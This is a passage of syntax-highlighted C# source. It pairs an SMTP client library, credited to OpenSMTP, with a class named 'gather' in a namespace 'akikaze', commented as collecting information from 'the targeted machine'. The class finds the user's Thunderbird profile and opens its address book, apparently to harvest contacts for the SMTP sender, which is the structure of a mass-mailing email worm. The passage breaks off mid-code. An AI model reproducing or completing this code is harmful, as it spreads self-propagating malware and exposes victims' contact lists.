                    </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">SendBufferSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sendBufferSize</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc11">LingerOption</span><span class="sc0"> </span><span class="sc11">lingerOption</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">LingerOption</span><span class="sc10">(</span><span class="sc5">true</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">LingerState</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lingerOption</span><span class="sc10">;</span><span class="sc0">
                    
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Cannot use SendMail() method without specifying target host and port"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">SocketException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Cannot connect to specified smtp host("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">OnConnect</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">GetStream</span><span class="sc10">();</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CloseConnection</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// add delimeter to log file
</span><span class="sc0">            </span><span class="sc11">LogMessage</span><span class="sc10">(</span><span class="sc6">"------------------------------------------------------\r\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc2">// fire disconnect event
</span><span class="sc0">            </span><span class="sc11">OnDisconnect</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc2">// destroy tcp connection if it hasn't already closed
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tcpc</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">         
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">AuthLogin</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AUTH LOGIN\r\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AuthImplemented</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">)))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">()))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">SERVER_CHALLENGE</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">()))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">AUTH_SUCCESSFUL</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc11">OnAuthenticated</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
                
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendRecipientList</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">recipients</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//  Iterate through all addresses and send them:
</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recipients</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">();)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">recipient</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EmailAddress</span><span class="sc10">)</span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RCPT TO: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">recipient</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// potential 501 error (not valid sender, bad email address) below:
</span><span class="sc0">                </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">   
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CheckMailMessage</span><span class="sc10">(</span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">returnMessage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Mail Message is missing "</span><span class="sc10">;</span><span class="sc0">
        
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">To</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">To</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">   
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc11">returnMessage</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"'To:' field"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc3">/**
         * NetworkStream Helper methods
         */</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">line</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">arrToSend</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc11">line</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">nw</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">arrToSend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arrToSend</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc2">//Console.WriteLine("[client]:" + line);
</span><span class="sc0">                </span><span class="sc11">LogMessage</span><span class="sc10">(</span><span class="sc11">line</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"[client]: "</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Write to Stream threw an System.Exception"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nw</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
            
                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">readBuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
            
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nw</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">readBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readBuffer</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">returnMsg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">readBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">LogMessage</span><span class="sc10">(</span><span class="sc11">returnMsg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"[server]: "</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">returnMsg</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Read from Stream threw an System.Exception: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">LogMessage</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Log</span><span class="sc0"> </span><span class="sc11">log</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Log</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">LogToText</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">log</span><span class="sc10">.</span><span class="sc11">logToTextFile</span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">LogPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc3">/**
         *
         * Checks stream returned from SMTP server for success code
         * If the success code is not present it will throw an error.       
         *
         */</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">successCode</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc11">successCode</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"ERROR - Expecting: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">successCode</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">". Recieved: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// Check to see if the command sent returns a Unknown Command Error
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">IsUnknownCommand</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">UNKNOWN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// Check to see if AUTH command returns valid challenge. 
</span><span class="sc0">        </span><span class="sc15">/// A valid AUTH string must be passed into this method.
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">AuthImplemented</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">SERVER_CHALLENGE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc3">/****************************************************************************
 *                                      *
 *              SMTP-Library                    *
 *              Taken from OpenSMTP                 *
 *        Entire project relicensed under GPLv2             *
 *                                      *
 *                                      *
 *                  END                     *
 *                                      *
 *                                      *
 ****************************************************************************/</span><span class="sc0">



</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">akikaze</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">gather</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/*Gathers various information of the targeted machine*/</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc0"> </span><span class="sc11">os</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">lang</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">homefolder</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">defaultdir</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">addressfile</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">available</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">addresses</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">thunderbirddir</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">getabook</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Unix</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">homefolder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">Personal</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">homedir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">homefolder</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">homedir</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc6">".thunderbird"</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc1">/* Standard Unix-System */</span><span class="sc0">
                    </span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">homefolder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/.thunderbird"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">thunderbirddir</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc6">"*default"</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/"</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"abook.mab"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">addressfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">homedir</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc6">".thunderbird"</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc1">/* MacOS X */</span><span class="sc0">
